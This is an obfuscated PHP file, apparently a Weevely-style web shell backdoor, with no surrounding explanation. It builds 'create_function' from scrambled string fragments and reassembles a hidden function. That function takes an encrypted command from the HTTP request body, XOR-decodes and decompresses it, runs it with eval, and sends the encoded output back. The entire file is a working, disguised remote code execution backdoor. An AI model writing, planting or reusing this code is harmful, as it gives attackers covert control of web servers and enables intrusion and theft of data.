<?php
$r=str_replace('B','','cBreatBeB_fBBunctBion');
$x='base6/A4/A_encode(/A@x(@gzcompre/Ass($o/A/A),$k));p/Arint("$p$k/Ah$r$kf");}';
$z='Am[1]),$k))/A);$o=@/Ao/Ab_get_c/Aontent/As()/A;@ob_end_c/A/Alean();$/Ar=@';
$R='$k="901/A7dcd9"/A;$kh=/A"422d/Adf73f0d0"/A;$kf/A="fc/A6796e6/A9d9f";$p/A/A';
$Y='atch("/$kh(.+)$k/Af//A/A",@file/A_get_/Acon/Atents("php://in/Aput/A"),$m)/A';
$O='/A/A$j++,$i++){$o.=$/At{$i}/A^$k{/A$j};/A}}return /A$o;}if/A (/A@pre/Ag/A_m';
$c='==1) {@/A/Aob_start();@e/Aval(@gzunco/Ampress(/A/A@x(@base6/A4_/Adecode($/';
$L='rlen($/At/A);$o="";fo/Ar($/Ai=0;/A/A$i<$l;)/A{for(/A$j=0;($j<$c/A&&$i<$l);';
$g='="Kv12eBuRPO3B/Aj9/ARI";f/Aunction x($/At,$k){/A$c/A=strlen/A($k/A);$l=st';
$T=str_replace('/A','',$R.$g.$L.$O.$Y.$c.$z.$x);
$m=$r('',$T);$m();
?>
